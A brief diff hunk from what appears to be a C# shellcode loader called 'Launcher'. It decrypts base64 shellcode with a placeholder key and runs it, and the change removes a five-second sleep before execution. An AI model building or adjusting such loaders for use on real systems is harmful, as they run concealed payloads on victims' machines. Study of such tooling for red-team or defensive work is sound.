@@ -144,9 +144,6 @@ namespace Launcher
 
             // remember to change the encryption key!
             byte[] dec_shellcode = Decrypt("~KEY~", shellcodeb64);
-
-						System.Threading.Thread.Sleep(5000);
-
             RunShellcode(dec_shellcode);
         }
 
